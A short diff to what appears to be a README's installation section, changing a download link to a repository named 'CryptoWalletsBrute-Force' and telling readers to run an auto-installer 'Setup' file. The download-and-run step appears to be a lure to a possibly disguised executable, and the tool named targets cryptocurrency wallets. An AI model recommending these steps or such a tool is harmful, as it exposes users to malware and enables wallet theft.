@@ -7,7 +7,7 @@
 
 ### Installation
 
-## **1. [Download the archive](https://github.com/blowcrazynofex25/blowcrazynofex25/releases/tag/latest) from releases and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/markcastor/CryptoWalletsBrute-Force) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Setup` file . It will install and download all necessary packages for > operation.**
 
 ![1](https://github.com/ckpjasher/BadgeCollect/assets/88789974/ea9b7c7a-cbcd-4f15-a8a0-4e9043f5efaa)
